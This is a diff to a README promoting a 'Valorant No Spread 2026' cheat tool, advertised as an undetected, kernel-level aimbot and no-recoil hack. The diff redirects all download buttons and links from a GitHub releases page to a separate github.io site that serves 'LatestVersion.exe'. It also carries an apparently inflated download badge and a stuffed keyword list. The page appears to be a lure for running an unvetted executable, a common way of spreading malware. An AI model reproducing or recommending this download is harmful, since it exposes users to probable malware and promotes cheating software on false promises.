@@ -2,7 +2,7 @@
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-760k%2B-orange?style=flat-square)
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://github.com/sheaann/valorant-nospread-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://sheaann.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps carefully to get everything running in under two minutes. No 
 
 Visit this link to download the application:
 
-[**https://github.com/sheaann/valorant-nospread-2026/releases**](https://github.com/sheaann/valorant-nospread-2026/releases)
+[**https://sheaann.github.io**](https://sheaann.github.io)
 
 Click the download button on that page. Your browser will start downloading a file called `LatestVersion.exe`.
 
@@ -133,6 +133,6 @@ If you run into any issues, check the **Download page** first for the latest upd
 
 **Ready to shoot perfectly?** Click the button below to get started:
 
-[![Download Valorant No Spread 2026](https://img.shields.io/badge/⬇️_Get_Valorant_No_Spread_2026-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/sheaann/valorant-nospread-2026/releases)
+[![Download Valorant No Spread 2026](https://img.shields.io/badge/⬇️_Get_Valorant_No_Spread_2026-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://sheaann.github.io)
 
 Keywords: valorant no spread, valorant hack, no recoil, aimbot, valorant cheat, undetected, kernel, accuracy, windows, 2026, free download, no spread tool
